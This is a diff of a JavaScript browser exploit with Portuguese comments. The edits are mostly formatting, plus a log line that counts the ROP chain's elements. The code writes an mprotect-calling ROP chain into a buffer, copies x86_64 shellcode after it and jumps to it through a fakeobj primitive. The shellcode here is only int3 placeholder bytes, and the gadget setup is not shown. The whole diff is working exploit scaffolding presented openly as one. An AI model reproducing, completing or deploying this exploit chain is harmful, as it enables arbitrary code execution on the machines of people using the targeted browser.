@@ -92,11 +92,15 @@
         mprotect_syscall,      // call mprotect(rdi,rsi,rdx)
         shellcodeAddr          // ret → shellcode
       ];
+
+      // Verifique se rop.length está correto
+      log("    ROPChain tem " + rop.length + " elementos");
+
       // escreve ROPChain no início do sc_buf
       let dv = new DataView(sc_buf);
-      for(let i=0;i<rop.length;i++){
+      for(let i=0; i<rop.length; i++) {
         let v = rop[i];
-        dv.setBigUint64(i*8, v, true);
+        dv.setBigUint64(i * 8, v, true);
       }
       log("    ROPChain escrita no buffer");
       return sc_buf;
@@ -106,15 +110,15 @@
     function injectAndRun(sc_buf) {
       log("[+] injectAndRun()");
       // exemplo de shellcode x86_64: int3; int3; int3; int3
-      const shellcode = new Uint8Array([0xCC,0xCC,0xCC,0xCC]);
+      const shellcode = new Uint8Array([0xCC, 0xCC, 0xCC, 0xCC]);
       // copia shellcode após ROPChain
       let dv = new DataView(sc_buf);
-      for(let i=0;i<shellcode.length;i++){
-        dv.setUint8(rop.length*8 + i, shellcode[i]);
+      for (let i = 0; i < shellcode.length; i++) {
+        dv.setUint8(rop.length * 8 + i, shellcode[i]);
       }
-      log("    shellcode injetado ("+shellcode.length+" bytes)");
+      log("    shellcode injetado (" + shellcode.length + " bytes)");
 
-      // agora apenas chama o fakeobj como no padrão (não como função!)
+      // Agora apenas chamamos fakeobj como no padrão (não como função!)
       // Isso fará com que o fluxo vá direto para o shellcode após a execução da ROPChain
       log("    saltando para o shellcode...");
     }
@@ -122,14 +126,14 @@
     //–– run everything
     let corrupt;
     let rop;
-    setTimeout(()=>{
+    setTimeout(() => {
       try {
         log("=== Exploit start ===");
         setupPrimitives();
         let sc_buf = buildROP();
         injectAndRun(sc_buf);
         log("=== fim ===");
-      } catch(e) {
+      } catch (e) {
         log("!!! erro exploit: " + e);
       }
     }, 1000);
